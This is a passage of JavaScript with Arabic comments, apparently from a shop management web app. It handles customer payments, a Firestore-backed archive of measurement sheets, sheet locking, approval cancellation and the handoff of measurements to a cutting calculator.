        'العميل: ' + who + '\n' +
        'المبلغ: ' + amount.toFixed(2) + ' د.ل\n' +
        'يُسدَّد من ' + dist.length + ' فاتورة\n' +
        'الدين بعدها: ' + money2(d.debt - (amount - creditAdded)).toFixed(2) + ' د.ل' +
        (creditAdded ? ('\nفائض يُضاف رصيداً: ' + creditAdded.toFixed(2) + ' د.ل') : '');
      if (!confirm(msg)) return;

      const payId = wsUid('PAY-');
      try {
        fsSet('payments', payId, {
          id: payId, customerName: who, amount: amount, type: 'كاش',
          reason: 'واصل سداد من كراسة القياسات',
          date: new Date().toLocaleString('ar-EG'), timestamp: Date.now(),
          signedBy: (window.currentShopUser && window.currentShopUser.name) || '',
          signedByUid: uid,
          receiverRole: (window.currentShopUser && window.currentShopUser.role) || '',
          debtDistribution: dist, creditAdded: creditAdded
        });
        touched.forEach(inv => fsUpdate('sales', inv.id, { paid: inv._newPaid, netDebt: inv._newDebt }));
        if (creditAdded > 0) {
          fsMergeIncrement('creditBalances', encodeURIComponent(who), 'amount', creditAdded, { name: who });
        }
      } catch (e) {
        alert('⚠️ تعذّر تسجيل الدفعة: ' + (e && e.message ? e.message : e));
        return;
      }

      showMiniToast('✅ سُجّلت دفعة ' + amount.toFixed(2) + ' د.ل', '#047480');
    }

    /* تحديث واجهة الأرشيف محلياً فور نجاح أي عملية على measurementJobs.
       الأرشيف يُحمّل على صفحات ولا يوجد له onSnapshot شامل، لذلك كانت
       الكتابة تصل إلى Firestore لكن الصف الظاهر لا يتغير إلا بعد إعادة
       التنشيط. هذا المساعد يجعل الواجهة تعكس العملية فوراً، بينما تبقى
       Firestore هو المصدر النهائي عند إعادة التحميل/المزامنة. */
    function upsertArchiveLocal(id, payload) {
      if (!id) return;
      try {
        // إزالة تكرار عرض نفس مستند Firestore فقط؛ لا ندمج كراسات تحمل اسم الزبون نفسه.
        const seen = new Set();
        archives = (Array.isArray(archives) ? archives : []).filter(a => {
          if (!a || !a.id) return false;
          if (seen.has(a.id)) return false;
          seen.add(a.id);
          return true;
        });
        const existing = (archives || []).find(a => a && a.id === id);
        const mapped = measurementArchiveMapDoc({ id: id, data: payload || {} });
        if (existing) {
          Object.assign(existing, mapped);
        } else if (mapped && !mapped.deleted) {
          archives = Array.isArray(archives) ? archives : [];
          archives.unshift(mapped);
        }
        /* v261 — تثبيت العنصر المحلي حتى لا تمحوه صفحة Firestore الجارية.
           قد تكون عملية pagination بدأت قبل الحفظ وتعود بلقطة قديمة؛ لذلك
           نحفظ الكراسة الجديدة في الكاش المحلي أيضاً، ثم نعيد الرسم في نفس
           اللحظة وعلى الدورة التالية للمتصفح لضمان ظهورها فوراً. */
        try {
          const localRows = (archives || []).map(a => ({
            id: a.id, name: a.name || '', data: a.data || {},
            updatedAt: a.updatedAt || Date.now(), createdAt: a.createdAt || a.updatedAt || Date.now(),
            deleted: !!a.deleted, deletedAt: a.deletedAt || 0, deletedBy: a.deletedBy || '',
            approved: !!a.approved, approvedInvId: a.approvedInvId || '',
            approvedTotal: a.approvedTotal || 0, approvedPaid: a.approvedPaid || 0,
            workStarted: !!a.workStarted, workStartedAt: a.workStartedAt || 0,
            workDone: !!a.workDone, workDoneAt: a.workDoneAt || 0, workDoneBy: a.workDoneBy || '',
            workStartedBy: a.workStartedBy || ''
          }));
          safeSetItem('ws_archives', JSON.stringify(localRows));
        } catch (e) { console.warn('حفظ كاش الأرشيف المحلي:', e); }
        const box = document.getElementById('archiveSearch');
        loadArchiveUI(box ? box.value : '', true);
        renderTrashUI();
        /* إعادة رسم فورية بعد اكتمال أي تغيير DOM جارٍ. */
        if (typeof requestAnimationFrame === 'function') {
          requestAnimationFrame(() => {
            try {
              const b = document.getElementById('archiveSearch');
              loadArchiveUI(b ? b.value : '', true);
              renderTrashUI();
            } catch (e) {}
          });
        }
      } catch (e) {
        console.warn('تحديث الأرشيف المحلي بعد الحفظ:', e);
      }
    }

    function patchArchiveLocal(id, patch) {
      if (!id) return;
      const apply = (a) => {
        if (!a || a.id !== id) return false;
        Object.keys(patch || {}).forEach(k => { a[k] = patch[k]; });
        return true;
      };
      let changed = false;
      for (let i = 0; i < (archives || []).length; i++) changed = apply(archives[i]) || changed;
      for (let i = 0; i < (archivesTrash || []).length; i++) changed = apply(archivesTrash[i]) || changed;
      if (patch && patch.deleted === true) {
        const pos = (archives || []).findIndex(a => a && a.id === id);
        if (pos >= 0) {
          const moved = archives.splice(pos, 1)[0];
          Object.assign(moved, patch);
          archivesTrash.unshift(moved);
          if (currentArchiveDocId === id) { currentArchiveIndex = -1; setCurrentArchiveDoc(null); }
        }
      } else if (patch && patch.deleted === false) {
        const pos = (archivesTrash || []).findIndex(a => a && a.id === id);
        if (pos >= 0) {
          const moved = archivesTrash.splice(pos, 1)[0];
          Object.assign(moved, patch);
          archives.unshift(moved);
        }
      }
      try {
        if (changed || (patch && (patch.deleted === true || patch.deleted === false))) {
          const box = document.getElementById('archiveSearch');
          loadArchiveUI(box ? box.value : '', true);
          renderTrashUI();
        }
      } catch (e) { console.warn('تحديث واجهة الأرشيف محلياً:', e); }
    }

    function removeArchiveLocal(id) {
      let removed = false;
      for (const arr of [archives, archivesTrash]) {
        const pos = arr.findIndex(a => a && a.id === id);
        if (pos >= 0) { arr.splice(pos, 1); removed = true; }
      }
      if (currentArchiveDocId === id) { currentArchiveIndex = -1; setCurrentArchiveDoc(null); }
      if (removed) {
        try {
          const box = document.getElementById('archiveSearch');
          loadArchiveUI(box ? box.value : '', true);
          renderTrashUI();
        } catch (e) {}
      }
    }

    function wsMergePendingArchives(){
      for(const item of window.WSArchiveOutbox?.pending(currentUserUid())||[]){
        if(archivesTrash.some(r=>r.id===item.id))continue;
        const index=archives.findIndex(r=>r.id===item.id),old=index<0?{}:archives[index];
        if(Number(old.updatedAt)>Number(item.payload.updatedAt))continue;
        const row={...old,id:item.id,name:item.payload.label,data:item.payload.state,updatedAt:item.payload.updatedAt,pendingSync:true};
        if(index<0)archives.unshift(row);else archives[index]=row;
      }
    }
    function loadArchiveUI(searchTerm, suppressServerSearch) {
      wsMergePendingArchives();
      // زر التنظيف: للمدير وحين توجد مكرّرات فارغة فعلاً — لا زر بلا عمل
      try {
        const cb = document.getElementById('cleanDupsBtn');
        if (cb) {
          /* 9.0.3 — الزر يغطي النوعين: الفارغة والمكرّرة الحقيقية.
             وتُقدَّم المكرّرة الحقيقية لأنها الأضرّ. */
          const emptyN = isManagerUser() ? findEmptyDuplicates().length : 0;
          const dupN   = isManagerUser()
            ? findDuplicateSheets().reduce((a, g) => a + g.extras.length, 0) : 0;
          cb.style.display = (emptyN + dupN) ? 'block' : 'none';
          if (dupN) {
            cb.textContent = '🧹 ' + dupN + ' كراسة مكرّرة' + (emptyN ? (' و' + emptyN + ' فارغة') : '');
            cb.onclick = function () { cleanDuplicateSheets(); };
          } else if (emptyN) {
            cb.textContent = '🧹 تنظيف ' + emptyN + ' كراسة مكرّرة فارغة';
            cb.onclick = function () { cleanEmptyDuplicates(); };
          }
        }
      } catch (e) {}

      let cont = document.getElementById('archiveList');
      let searchBox = document.getElementById('archiveSearch');
      // نحافظ على نص البحث الحالي عند إعادة الرسم بعد حذف/تحميل عنصر، إلا إذا مُرِّر نص بحث جديد صراحة
      let term = (searchTerm !== undefined ? searchTerm : (searchBox ? searchBox.value : '')).trim();
      if (searchTerm !== undefined && searchTerm.length >= 2) {
        // القراءة المحلية تبقى المصدر الأول؛ البحث الخادمي يضيف فقط المستندات غير المحمّلة.
      }
      // نفلتر على الفهارس الأصلية في المصفوفة كي تبقى كل أزرار التحميل/الحذف تشير للعنصر الصحيح دائماً
      if (!suppressServerSearch && searchTerm !== undefined && String(searchTerm).trim().length >= 2) searchMeasurementArchiveServer(searchTerm);
      let indices = archives.map((a, idx) => idx);
      if(term) indices = indices.filter(idx => { const a=archives[idx]||{}; const d=a.data||{}; return [a.name,d.custName,d.custPhone].map(v=>String(v||'').toLowerCase()).join(' ').includes(term.toLowerCase()); });

      /* ترتيب أبجدي باسم الزبون.
         كان الترتيب بالأحدث تحديثاً — وهو مفيد ليوم واحد، لكنه يجعل
         البحث عن زبون بعد أسبوع تصفّحاً أعمى: لا يعرف المستخدم أين يقع
         اسمه في القائمة فيمرّرها كلها. وبالأبجدي يذهب إليه مباشرةً.
         والفهارس تبقى إلى المصفوفة الأصلية، فأزرار الفتح والحذف تشير
         للعنصر الصحيح مهما تغيّر ترتيب العرض. */
      indices.sort((x, y) => {
        const nx = ((archives[x].data && archives[x].data.custName) || archives[x].name || '').trim();
        const ny = ((archives[y].data && archives[y].data.custName) || archives[y].name || '').trim();
        const tx = Number(archives[x].updatedAt) || 0, ty = Number(archives[y].updatedAt) || 0;
        /* المقارنة الأبجدية تتم على الاسم المُطبَّع (wsNormName): بدونه
           تتفرّق «أحمد» و«احمد» في موضعين متباعدين من القائمة، فيظنّ
           المستخدم أن الكراسة ضاعت وينشئ واحدة جديدة. */
        const cmpName = () => wsNormName(nx).localeCompare(wsNormName(ny), 'ar');
        return archiveSort === 'date'
          ? (ty - tx) || cmpName()      // الأحدث أولاً
          : cmpName() || (ty - tx);     // أبجدي، والأحدث عند التطابق
      });

      // نُظهر الزر الفعّال ليعرف المستخدم بأيّ ترتيب ينظر
      try {
        document.querySelectorAll('#archiveSection .sort-btn').forEach(b =>
          b.classList.toggle('active', b.dataset.sort === archiveSort));
      } catch (e) {}
      if(indices.length === 0) {
        cont.innerHTML = term ? '<div style="text-align:center; color:var(--muted); padding:16px; font-size:13px;">لا توجد نتائج مطابقة</div>' : '';
        return;
      }
      cont.innerHTML = indices.map(idx => { const a = archives[idx]; return `
        <!-- ⚠️ 9.5.0 — السحب للحذف استُبدل بزرّ صريح.

             السحب كان يجمع ثلاث علل:
               • **غير مرئي**: لا شيء يدلّ عليه، فمن لا يعرفه لا يجده.
               • **يُطلَق بالخطأ**: الإصبع يمرّ أفقياً وهو يتصفّح، فتنزلق
                 الكراسة نحو الحذف بلا قصد.
               • **يتعارض مع التمرير**: معالجات اللمس على كل سطر تزاحم
                 تمرير القائمة نفسها.

             والزرّ يعالج الثلاثة: يُرى، ولا يُضغط إلا قصداً، ولا يمسّ
             التمرير. -->
        <div class="archive-item-wrapper">
          <div class="archive-item ${a.approved ? 'is-approved' : 'not-approved'}"
               onclick="loadArchiveByIndex(${idx})">
            <span class="arch-name">
              <span class="arch-dot" aria-hidden="true"></span>
              <span>
                ${escHtml(a.name)}
                <span class="arch-state">${a.approved
                  ? ('✓ خدمة معتمدة' + (a.approvedTotal ? (' — ' + Number(a.approvedTotal).toFixed(2) + ' د.ل') : ''))
                  : '✗ لم تُعتمد بعد'}</span>
                ${(() => {
                  // من بدأ العمل — بخط صغير جداً، وكلهم لا أوّلهم فقط
                  const lbl = workStartersLabel(a);
                  if (!lbl) return '';
                  // «تم الانتهاء» يتصدّر السطر: هو الخبر الأهم عند تصفّح الأرشيف
                  const head = a.workDone
                    ? ('✔ انتهى' + (a.workDoneBy ? (' — ' + escHtml(a.workDoneBy)) : '') + ' · بدأه: ')
                    : '▶ جارٍ العمل: ';
                  return `<div class="arch-workers">${head}${lbl}</div>`;
                })()}
                ${archiveSort === 'date' && a.updatedAt
                    ? `<div class="arch-when">🕒 ${escHtml(new Date(a.updatedAt).toLocaleString('ar-EG', {dateStyle:'short', timeStyle:'short'}))}</div>`
                    : ''}
                ${debtLineFor(a.data && a.data.custName)}
              </span>
            </span>
            <!-- ⚠️ 9.5.1 — زرّ الحذف انتقل إلى طرف اليسار.
                 كان داخل كتلة الاسم، وهي أوّل عناصر الصف — وأوّلُ العنصر
                 في صفحة dir="rtl" يقع على **اليمين**، أي ملاصقاً لاسم
                 العميل. ووجود زرّ حذف ملاصق للاسم يجعل الإصبع يمرّ عليه
                 في كل مرة يقرأ فيها المستخدم السطر.
                 الآن في آخر الصف — وهو طرف اليسار — بعيداً عن مسار القراءة
                 وعن زرّ فتح الكراسة. -->
            <span style="display:flex; align-items:center; gap:7px; flex-shrink:0;">
              ${isManagerUser() ? `<button class="arch-del" title="حذف الكراسة"
                   aria-label="حذف الكراسة"
                   onclick="event.stopPropagation(); deleteArchive(${idx});">🗑</button>` : ''}
              ${a.approved
                ? `<button class="startwork-btn${a.workDone ? ' done' : (a.workStarted ? ' started' : '')}"
                       title="${isManagerUser() ? 'اضغط: ابدأ في العمل — اضغط مطوّلاً: إلغاء الاعتماد' : 'ابدأ في العمل'}"
                       onclick="event.stopPropagation(); startWorkOnService(${idx});"
                       oncontextmenu="event.preventDefault(); event.stopPropagation(); offerCancelApproval(${idx}); return false;"
                       ontouchstart="beginLongPress(event, ${idx});"
                       ontouchend="endLongPress();" ontouchmove="endLongPress();"
                       onmousedown="beginLongPress(event, ${idx});"
                       onmouseup="endLongPress();" onmouseleave="endLongPress();">
                     <i class="fas fa-${a.workDone ? 'circle-check' : (a.workStarted ? 'gears' : 'play')}"></i> ${a.workDone ? 'تم الانتهاء' : (a.workStarted ? ('جارٍ العمل' + (workStartersOf(a).length > 1 ? (' (' + workStartersOf(a).length + ')') : '')) : 'ابدأ في العمل')}
                   </button>`
                : ''}
              ${idx === currentArchiveIndex
                ? '<span style="font-size:10px; background:var(--accent); color:white; padding:3px 8px; border-radius:8px; font-weight:700; white-space:nowrap;">قيد التعديل الآن</span>'
                : '<i class="fas fa-chevron-left" style="color:#cbcccc"></i>'}
            </span>
          </div>
        </div>
      `; }).join('');
    }

    // منطق السحب (Swipe Logic)
    /* حُذف من هنا في 9.5.0: touchStartX و currentTranslate و
       handleTouchStart/Move/End — آليّة السحب للحذف في سجل الكراسات.
       استُبدلت بزرّ صريح بجوار اسم العميل (انظر .arch-del)، فصارت هذه
       الدوال بلا مُستدعٍ. وتركُ كودٍ ميت يُوهم قارئه بأن للسحب أثراً
       ما زال قائماً، فيُصلحه أو يبني عليه. */


    /* ============================================================
       وضع العرض للكراسات المحفوظة
       ------------------------------------------------------------
       فتح كراسة زبون من الأرشيف كان يجعلها قابلة للكتابة فوراً، فأي
       لمسة عابرة على الجدول أو نموذج الإضافة تُسجَّل في مقاسات زبون
       سابق — والحفظ التلقائي يرفعها للسيرفر خلال ثوانٍ بلا سؤال.
       الآن تُفتح للقراءة فقط، ولا تُفتح للتعديل إلا بضغطة صريحة.
       الكراسة الجديدة تبدأ مفتوحة كالمعتاد؛ القفل للمحفوظ وحده.
       ============================================================ */
    /* ══════════════════════════════════════════════════════════════════
       قفل الكراسة بعد نصف ساعة من آخر مقاس — 9.7.0
       ══════════════════════════════════════════════════════════════════
       طُلب: «اقفل الزبائن بعد ١٠ من رفع المقاسات ولا تسمح بالإضافة
       لجدول القياسات لأي زبون».

       والمرساة هي **آخر مقاس أُضيف** لا لحظة فتح الكراسة. والفرق جوهري:
       لو قُفلت بعد عشر دقائق من الفتح، لانقفلت في وجه من يقيس شقّة
       فيها عشرون شبّاكاً — وذلك يوقف العمل لا ينظّمه. أمّا القياس من
       آخر إضافة فلا يقفل ما دام العمل جارياً: كل مقاس جديد يُعيد العدّ.
       فالقفل لا يقع إلا حين **يتوقّف** الإدخال فعلاً — وهو تعريف
       «اكتمل رفع المقاسات».

       وهذا القفل هو الحارس الأخير ضد الكتابة فوق عميل: حتى لو أخطأ
       المستخدم وفتح كراسة زبون قديم، لا يستطيع أن يضيف إليها بعد
       اكتمالها — فتبقى كما سُلّمت للورشة.

       والمدير يفتحها بضغطة حين يلزم، فالقاعدة تنظّم ولا تسجن. */
    const SHEET_IDLE_LOCK_MS = 30 * 60 * 1000;

    function lastEntryAt() {
      let t = 0;
      (jobList || []).forEach(i => { if (typeof i.addedAt === 'number' && i.addedAt > t) t = i.addedAt; });
      return t;
    }

    /* القفل الزمني: كراسة فيها مقاسات، ومضى على آخرها عشر دقائق. */
    function isSheetIdleLocked() {
      if (isManagerUser()) return false;                 // المدير بلا قيد
      if (window._sheetIdleUnlocked) return false;       // فُتحت صراحةً في هذه الجلسة
      const t = lastEntryAt();
      if (!t) return false;                              // لا مقاسات: لا قفل
      return (Date.now() - t) > SHEET_IDLE_LOCK_MS;
    }

    /* فتح المدير: يدوم للجلسة وحدها ويُسجَّل في التنبيه.
       ولا يُحفظ في الكراسة: فتحٌ دائم يُلغي القاعدة من أصلها، وأول من
       يستعمله سينسى إعادة القفل. */
    function unlockIdleSheet() {
      if (!isManagerUser()) { alert('⛔ فتح الكراسات المقفلة متاح للمدير فقط.'); return; }
      window._sheetIdleUnlocked = true;
      showMiniToast('🔓 فُتحت الكراسة للإضافة — تُقفل تلقائياً عند إعادة التحميل', '#16477f');
      try { renderTable(); } catch (e) {}
    }

    function idleLockMessage() {
      const mins = Math.round((Date.now() - lastEntryAt()) / 60000);
      return '🔒 أُقفلت هذه الكراسة تلقائياً.\n\n' +
             'مضى ' + mins + ' دقيقة على آخر مقاس فيها، فاعتُبر رفعُ المقاسات مكتملاً.\n\n' +
             'لإضافة مقاسات جديدة: ابدأ كراسة جديدة بزرّ «جديد».\n' +
             'وإن كانت فعلاً تكملةً لهذه، اطلب من المدير فتحها.';
    }

    function isSheetLocked() { return sheetViewOnly === true; }

    function setSheetViewOnly(on) {
      /* شبكة أمان: كراسة فارغة لا معنى لقفلها إطلاقاً — لا شيء فيها
         يُحمى من التعديل. وقفلها هو ما ينتج شكوى «لا أستطيع الكتابة»
         بلا سبب ظاهر، لأن الحقول تبدو عادية والضغطات لا تصلها.
         فأي مسار يقفل كراسة فارغة — الآن أو مستقبلاً — يُبطَل هنا. */
      const empty = (!Array.isArray(jobList) || jobList.length === 0) &&
                    !document.querySelector('#billArea .bill-row') &&
                    !((document.getElementById('custName') || {}).value || '').trim();
      sheetViewOnly = !!on && !empty;
      applySheetLockUI();
    }

    /* فحص دوري خفيف: يرفع القفل عن كراسة فارغة بقيت مقفولة بأي طريق
       (حالة محفوظة قديمة، أو مسار لم يمرّ بـ setSheetViewOnly). */
    setInterval(() => {
      try {
        if (!sheetViewOnly) return;
        const empty = (!Array.isArray(jobList) || jobList.length === 0) &&
                      !document.querySelector('#billArea .bill-row');
        if (empty) setSheetViewOnly(false);
      } catch (e) {}
    }, 4000);

    function applySheetLockUI() {
      const locked = sheetViewOnly;
      // صندوق واحد أسفل الجدول يضم التنبيه والزر معاً
      const box = document.getElementById('unlockSheetBox');
      if (box) box.style.display = locked ? '' : 'none';

      // نموذج إدخال المقاسات وأزرار الإضافة
      ['inputSection','bulkPasteBox'].forEach(id => {   // typeButtonsRow أُزيل
        const el = document.getElementById(id);
        if (!el) return;
        el.style.opacity = locked ? '.45' : '';
        el.style.pointerEvents = locked ? 'none' : '';
      });
      const mainBtn = document.getElementById('mainActionBtn');
      if (mainBtn) { mainBtn.disabled = locked; mainBtn.style.opacity = locked ? '.45' : ''; }
      const extras = document.getElementById('extrasCol');
      if (extras) extras.style.pointerEvents = locked ? 'none' : '';
      // القفل يتحكم في القابلية للنقر فقط — الظهور يبقى محكوماً بالقسم النشط
      try { applyExtrasVisibility(); } catch (e) {}

      /* اسم الزبون ورقمه يُقفلان مع الكراسة المحفوظة أو المعتمدة.
         تعديلهما بلمسة عابرة يعني نسبة مقاسات زبون إلى آخر — والكراسة
         مرتبطة بفاتورة تحمل الاسم نفسه، فتغييره هنا يفصلها عنها. */
      applyIdentityFieldsLock();   // تحسم وضع العرض والاعتماد معاً

      /* بطاقة بيانات الزبون: مخفية في وضع العرض، تظهر عند فتح التعديل.
         البيانات نفسها معروضة في رأس الجدول، فلا شيء يضيع بإخفائها. */
      const custCard = document.getElementById('customerCard');
      if (custCard) custCard.style.display = locked ? 'none' : '';

      // البنود المالية تُقفل أيضاً: هي جزء من نفس الكراسة وتُرفع بنفس الحفظ التلقائي
      const billArea = document.getElementById('billArea');
      if (billArea) { billArea.style.opacity = locked ? '.55' : ''; billArea.style.pointerEvents = locked ? 'none' : ''; }
      document.querySelectorAll('.card > button[onclick="addBillRow()"]').forEach(b => {
        b.disabled = locked; b.style.opacity = locked ? '.45' : '';
      });

      renderTable();   // الجدول يُعيد رسم أزراره حسب حالة القفل
    }

    /* ══ قفل الكراسة المحفوظة — ولا يُفتح التعديل إلا بالزر أسفل الجدول ══
       الكراسة الحديثة تُفتح للتعديل بضغطة: قد يكون الفنّي ما زال عند
       الزبون واكتشف مقاساً ناقصاً.

       أما بعد عشر دقائق فالمقاسات صارت **سجلاً**: أُرسلت للقص أو بُنيت
       عليها فاتورة أو رآها زميل. وفتحها للتعديل حينها يعني تغيير رقم
       يعمل عليه غيرك، أو إضافة مقاس لا يعرف عنه من قصّ.

       والأهم: المستخدم الذي يفتح كراسة قديمة غالباً يريد **شغلاً جديداً
       لنفس الزبون** لا تعديل القديم — وكان يفتحها ويكتب فيها، فتختلط
       مقاسات عملين في كراسة واحدة، أو يُنشئ نسخة ثانية بلا قصد.

       فبعد المهلة: التعديل للمدير وحده، ويُعرَض على العضو المخرج الصحيح —
       كراسة جديدة باسم الزبون نفسه. */
    const SHEET_EDIT_TTL = Infinity; // لم يعد عمر الكراسة مساراً بديلاً عن زر التعديل أسفل الجدول

    function sheetAgeMs() {
      const a = archives.find(x => x.id === currentArchiveDocId);
      if (!a) return 0;
      return Date.now() - (a.updatedAt || a.createdAt || Date.now());
    }

    function unlockArchivedSheet() {
      /* المسار الوحيد المسموح به لتعديل كراسة قديمة:
         الزر الأخضر «تعديل وإضافة مقاسات» الموجود مباشرةً تحت الجدول.
         لا تُفتح الكراسة بالنقر على صف، أو خانة، أو قفل، أو اسم العميل،
         ولا تتغير حسب عمر الكراسة. */
      if (!sheetViewOnly || !currentArchiveDocId) {
        showMiniToast('لا توجد كراسة قديمة مفتوحة للتعديل. افتحها من الأرشيف أولاً.', '#157f4a');
        return;
      }
      setSheetViewOnly(false);
      try {
        safeSetItem('ws_sheet_viewonly', '0');
        saveCurrentState();
      } catch (e) {}
      showMiniToast('✏️ تم فتح الكراسة للتعديل — أي إضافة أو تعديل سيُحفظ في هذه الكراسة فقط.', '#157f4a');
    }

/* ════════════════════════════════════════════════════════════
       إلغاء اعتماد خدمة — للمدير وحده
       ------------------------------------------------------------
       الاعتماد يكتب ثلاثة أشياء: الفاتورة، وسجل مقبوضاتها، ورصيد الفائض
       إن وُجد. فالإلغاء يجب أن يعكسها كلها — وإلا بقيت فاتورة يتيمة في
       الفواتير لا يعرف أحد مصدرها، ويظل الزبون مطالَباً بدينها.

       والأهم: يبقى وسم الاعتماد على الكراسة يمنع اعتمادها ثانيةً. فلو
       أُلغي الوسم بلا حذف الفاتورة، لأُعيد الاعتماد فصارت فاتورتان.

       ══ شرط السلامة ══
       لا يُلغى الاعتماد إن كانت الفاتورة قد تحرّكت بعده: سُدِّد عليها،
       أو أُرجعت منها بضاعة، أو عُدِّلت. لأن حذفها عندها يمحو عملاً لاحقاً
       لا علاقة له بالكراسة — دفعات حقيقية قبضها المحل ومرتجعات سُجّلت.
       في هذه الحالة نوقف الإلغاء ونوجّه للفواتير حيث أدوات العكس الكاملة.

       (الاعتماد لا يخصم من المخزن أصلاً، فلا مخزون يُعاد هنا.)
       ════════════════════════════════════════════════════════════ */
/* ══ الضغط المطوّل ══
       يفتح خيار إلغاء الاعتماد للمدير وحده. مدة الضغط 600 مللي ثانية —
       أطول من لمسة عابرة وأقصر من أن تُتعب الإصبع.
       endLongPress يُستدعى عند الرفع وعند التحريك معاً: التحريك يعني أن
       المستخدم يمرّر القائمة لا يضغط الزر، فلا يصح أن تفتح له نافذة حذف. */
    let _lpTimer = null, _lpFired = false;

    function beginLongPress(ev, idx) {
      if (!isManagerUser()) return;           // غير المدير: الزر ضغطة عادية فقط
      endLongPress();
      _lpFired = false;
      _lpTimer = setTimeout(() => {
        _lpFired = true;
        try { if (navigator.vibrate) navigator.vibrate(30); } catch (e) {}
        offerCancelApproval(idx);
      }, 600);
    }
    function endLongPress() { if (_lpTimer) { clearTimeout(_lpTimer); _lpTimer = null; } }

    function offerCancelApproval(idx) {
      if (!isManagerUser()) return;
      const a = archives[idx];
      if (!a || !a.approved) return;
      if (confirm('خدمة «' + (a.name || '') + '»\n\nهل تريد إلغاء اعتمادها؟\n' +
                  'سيُحذف حسابها من الفواتير وتعود قابلة للاعتماد من جديد.')) {
        cancelServiceApproval(idx);
      }
    }

    /* قائمة من بدأ العمل في الخدمة.
       أكثر من عضو يبدأ في نفس الخدمة: المقاسات أنواع، فقد يأخذ أحدهم
       الأبواب والنوافذ ويأخذ آخر السرانتي والناموسيات. فالحقل قائمة لا
       اسماً واحداً — واسم واحد كان يعني أن الثاني يمحو الأول فلا يُعرف
       من عمل ماذا.
       (يقبل الشكل القديم — نص مفرد — للكراسات المسجَّلة قبل هذا التغيير.) */
    function workStartersOf(a) {
      if (!a) return [];
      const raw = a.workStartedBy;
      if (Array.isArray(raw)) return raw.filter(x => x && x.name);
      if (typeof raw === 'string' && raw.trim()) {
        return [{ name: raw.trim(), uid: '', at: a.workStartedAt || 0 }];
      }
      return [];
    }

    function workStartersLabel(a) {
      const list = workStartersOf(a);
      if (!list.length) return '';
      return list.map(x => {
        const t = x.at ? new Date(x.at).toLocaleDateString('ar-EG') : '';
        return escHtml(x.name) + (t ? (' · ' + escHtml(t)) : '');
      }).join(' — ');
    }

    /* تسليم موثوق لحاسبة القص: نتحقق أن الحمولة كُتبت ويمكن قراءتها قبل الانتقال.
       يمنع الانتقال إلى صفحة القص مع بيانات قديمة/ناقصة إذا تعذّر التخزين المحلي. */
    function persistCuttingHandoff(payload) {
      try {
        const serialized = JSON.stringify(payload);
        localStorage.setItem('handoff_to_cutting', serialized);
        const stored = localStorage.getItem('handoff_to_cutting');
        const check = stored ? JSON.parse(stored) : null;
        if (!check || check.ts !== payload.ts || check.lines !== payload.lines ||
            !Array.isArray(check.items) || check.items.length !== payload.items.length) {
          throw new Error('تعذّر التحقق من حفظ المقاسات كاملة');
        }
        return true;
      } catch (e) {
        console.error('persistCuttingHandoff:', e);
        alert('⚠️ لم يتم إرسال المقاسات لأن حفظها المؤقت تعذّر. أفرغ بعض مساحة المتصفح ثم أعد المحاولة.');
        return false;
      }
    }

    /* بدء العمل: يسجّل من بدأ ومتى، ثم يُرسل المقاسات مباشرةً لحاسبة القص. */
    function startWorkOnService(idx) {
      if (!requireMeasurementsAccess('بدء العمل في الخدمة')) return;
      if (_lpFired) { _lpFired = false; return; }   // كانت ضغطة مطوّلة، لا عادية
      const a = archives[idx];
      if (!a || !a.approved) return;

      /* ══ الحالة الثالثة: تم الانتهاء ══
         العمل مرّ بمرحلتين ظاهرتين: «جارٍ العمل» ثم «تم الانتهاء». من بدأ
         هو من يُنهي — فالضغطة الثانية تُغلق الخدمة بدل أن تُعيد إرسال
         المقاسات للقص مرة أخرى بلا داعٍ. */
      if (a.workDone) {
        const dWhen = a.workDoneAt ? new Date(a.workDoneAt).toLocaleString('ar-EG') : '—';
        if (confirm('هذه الخدمة منتهية.\n\nأنهاها: ' + (a.workDoneBy || '—') + '\nفي: ' + dWhen +
                    '\n\nهل تريد إعادة فتحها (العودة إلى «جارٍ العمل»)؟')) {
          fsUpdate('measurementJobs', a.id, { workDone: false, workDoneAt: 0, workDoneBy: '' });
          patchArchiveLocal(a.id, { workDone: false, workDoneAt: 0, workDoneBy: '' });
          showMiniToast('أُعيد فتح العمل', '#157f4a');
        }
        return;
      }

      if (a.workStarted) {
        const startedBy = workStartersOf(a).map(x => x.name || '؟').join('، ');
        if (confirm('العمل جارٍ في خدمة «' + (a.name || '') + '»' +
                    (startedBy ? ('\nبدأه: ' + startedBy) : '') +
                    '\n\nهل انتهى العمل فيها؟')) {
          const doneAt = Date.now();
          const doneBy = currentUserName();
          fsUpdate('measurementJobs', a.id, {
            workDone: true, workDoneAt: doneAt, workDoneBy: doneBy
          });
          patchArchiveLocal(a.id, { workDone: true, workDoneAt: doneAt, workDoneBy: doneBy });
          showMiniToast('✅ تم إنهاء العمل في الخدمة', '#047480');
          return;
        }
        // لم ينتهِ بعد: نعرض إعادة إرسال المقاسات للقص
        if (!confirm('هل تريد إعادة إرسال مقاساتها إلى حاسبة القص؟')) return;
      }

      const starters = workStartersOf(a);
      const me = currentUserUid();
      const already = starters.some(x => (x.uid && x.uid === me) || (!x.uid && x.name === currentUserName()));

      let msg = 'بدء العمل في خدمة «' + (a.name || '') + '»؟\n\n';
      if (starters.length) {
        msg += 'بدأ فيها بالفعل: ' + starters.map(x => x.name).join('، ') + '\n';
        msg += already ? '(وأنت منهم)\n' : '';
        msg += '\n';
      }
      msg += 'ستُرسل مقاسات الكراسة مباشرةً إلى حاسبة القص والمواد الخام.';
      if (!confirm(msg)) return;

      if (!already) {
        /* إضافة ذرّية بـ arrayUnion لا «اقرأ ثم اكتب».
           عضوان يضغطان من هاتفيهما في اللحظة نفسها: القراءة ثم الكتابة
           تجعل كلاً منهما يقرأ القائمة القديمة ويكتب فوق الآخر، فيختفي
           أحدهما من سجل من بدأ العمل. arrayUnion يضيف على السيرفر بلا
           قراءة، فيُسجَّل الاثنان. */
        fsArrayUnion('measurementJobs', a.id, 'workStartedBy',
          { name: currentUserName(), uid: me, at: Date.now() },
          { workStarted: true, workStartedAt: a.workStartedAt || Date.now() });
      }

      /* الإرسال للقص يُبنى من الكراسة المؤرشفة مباشرةً.
         كان يفتح الكراسة في الشاشة ثم ينتظر 450 مللي ثانية ثم يستدعي
         sendToCutting — وفي ذلك خطآن: يعتمد على تأخير زمني قد لا يكفي على
         جهاز بطيء فيُرسل جدولاً فارغاً، ويستبدل الكراسة الجارية تحت يد
         المستخدم بلا داعٍ. الآن: البيانات جاهزة في a.data، فنبنيها ونمضي. */
      const items = (a.data && Array.isArray(a.data.jobList)) ? a.data.jobList : [];
      if (!items.length) { alert('لا توجد مقاسات في هذه الكراسة لإرسالها للقص.'); return; }

      const noteOf = i => {
